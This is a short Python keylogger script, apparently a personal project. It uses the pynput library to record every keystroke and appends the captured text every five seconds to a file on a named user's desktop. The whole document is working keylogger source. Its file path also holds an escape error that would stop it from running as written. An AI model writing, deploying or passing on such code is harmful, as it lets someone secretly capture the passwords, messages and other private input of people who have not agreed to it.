import pynput 
import threading

log = ""
def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "
    
def report():
    global log
    with open("C:\Users\\nikit\\Desktop\\KeyloggerProject.txt" , "a") as file1:
        file1.write(log)
    log = ""
    timer = threading.Timer(5, report)
    timer.start()
    
keyboard_input = pynput.keyboard.Listener(on_press= process_key_press)

with keyboard_input:
    report()
    keyboard_input.join()